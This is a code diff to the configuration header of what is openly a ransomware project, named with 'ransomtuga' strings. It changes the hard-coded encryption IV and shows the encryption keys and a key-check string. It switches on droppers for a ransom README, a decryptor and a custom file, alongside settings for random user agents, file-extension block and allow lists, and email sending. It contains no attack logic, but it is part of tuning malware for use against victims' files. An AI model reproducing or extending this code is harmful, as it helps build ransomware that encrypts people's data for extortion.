@@ -17,7 +17,7 @@
 //global variables
 
 /* crypt settings */
-#define IV				(string)skCrypt("_bestransistuga")					// constant iv of decrytpion & encryption
+#define IV				(string)skCrypt("bestransomistuga")					// constant iv of decrytpion & encryption
 #define KEY				(string)skCrypt("ransomtugaISthebesthereactually!")	// constant key of decryption & encryption
 #define KEYOFKEY		(string)skCrypt("tugaransomISthebesthereactually!")	// constant key of decryption & encryption of the key in the file
 #define CHECK_CONTENT	(string)skCrypt("This is a sample content!!!")		// content of the file used to check the correcy key
@@ -67,9 +67,9 @@
 #define RANDOM_USERAGENT	true	// enable or disable random user agent (if false it uses the first one)
 #define ENABLE_BLACKLIST	true	// enable or disable blacklist for file extension
 #define ENABLE_WHITELIST	true	// enable or disable whitelist for file extension
-#define DROP_README			false	// enable or disable README dropper
-#define DROP_DECRYPTOR		false	// enable or disable Decryptor dropper
-#define DROP_CUSTOM_FILE	false	// enable or disable custom file dropper (custom file location at the beggining of main.cpp)
+#define DROP_README			true	// enable or disable README dropper
+#define DROP_DECRYPTOR		true	// enable or disable Decryptor dropper
+#define DROP_CUSTOM_FILE	true	// enable or disable custom file dropper (custom file location at the beggining of main.cpp)
 #define CHANGE_WALLPAPER	false	// enable or disable changer of wallpaper
 #define BACKUP_INFOFILE		true	// enable or disable backup maker in current folder for infoFile in debug mode
 #define SEND_EMAIL			true	// enable or disable email sender
